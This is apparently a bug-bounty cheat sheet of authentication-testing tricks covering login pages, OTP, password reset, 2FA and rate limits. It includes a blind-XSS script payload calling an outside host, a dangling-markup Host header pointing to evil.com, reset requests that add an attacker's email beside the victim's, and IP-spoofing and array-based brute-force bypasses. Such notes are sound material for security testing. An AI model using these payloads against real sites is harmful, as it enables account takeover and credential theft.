# Authentication Testing

## Login Page:
  - If you found admin login page. Try this tips. 
  - First login as wrong credentials the intercept request to burp. 
  - Change email to your bxss payload. If you lucky you will get bxss. 
  - Ex: "><script src=https://xyz.xss.ht></script>"@subdomain.burpcollaborator.net 
  - If you get responses from collaborator it possible get fire bxss. 

## Email confirmation bypass:

  - Try response manupulate to cofirm email
  - while confirm email try this: intecept request to burp and change your mail to another person mail if you cloud get success. 
  
## OTP Relate Testing:

  - If you can manupulate response code to 200 and 302.
  - If you brute force login OTP
    - If WAF try Ip rote extension
    - Read some article and reports about rate limit bypass
  - While you confirming OTP try to change you email to victim email: if you cloud login as another user.
  - If target reseting password via OTP confirmation than you can add another emil with your mail: while request for reseting password:
    ```json
    {
     "email": [
       "victim@email.com",
       "you@email.com"
      ]
    }
    # If you got OTP in your mail try reset password: then possible victim account takeover 
    ```

## Password Reset functionality:
  - Try to add Host header in reset password request.
  - [report](https://hackerone.com/reports/698416) 
  - While reset password see if we can reset without knowing current password. By response manipulate. 
  - While reseting password intercept request to burp and see if you cloud add ```<a href>``` tag and see in email if there anything changes. 

## Authentication:
	
  - Bypass Rate Limit with X-Forwarded-For: to pwn authentication
  - Host header injeciton in forgot password page
	- Test Remember me functionality
  - Test password reset and/or recovery
  - 2FA Bypass
    - Access the content directly (site.com/profile)
    - Login using Oauth gmail or FB to bypass 2FA
    - Reset Password and login inoto the account to bypass 2FA 
    - Use old toke or change the response
  - Goto the reset password page and add two emails while sending the reset password link
		[You can recive two password reset link]
  - Web Cache deception [site.com/profile/min.js]
  - PHP protection can be bypassed using [] such as password=1234 ----> password[]= (CSRF token too)
  - While resetting password change the host header to your server (VPS) = secret link to your VPS
  - Bypass rate limit protection: You can use IP-Rotate burp extension or you can change system IP per request.
	
  - Password reset poisoning via dangling markup
	```Host: victim.com:'<a href="//evil.com/?  ```

  - Add X-Forwarded-For: 127.0.0.1 or 1-1000 to bypass the rate limit protection.

  - Login into the valid account and then into valid one, repeat this process to fool the sever to bypass the rate limit protection (observe that your IP is blocked        if your submit 3 incorrect logins in a row. However, you can reset the counter by logging in to your own account before the limit is reached)

  - replace the single string value of the password with an array of string containing all of the candidate passwords, for Example:
	
```json
	"username": "test",
	"password": [
		"1234",
		"password",
		"qwerty"
		....
	]
```

  - If you enter the wrong code twice, you will be logged out again bypass it using macros (You need to use burp's session handlling features to log back in
    automatically before sending each request.)
	
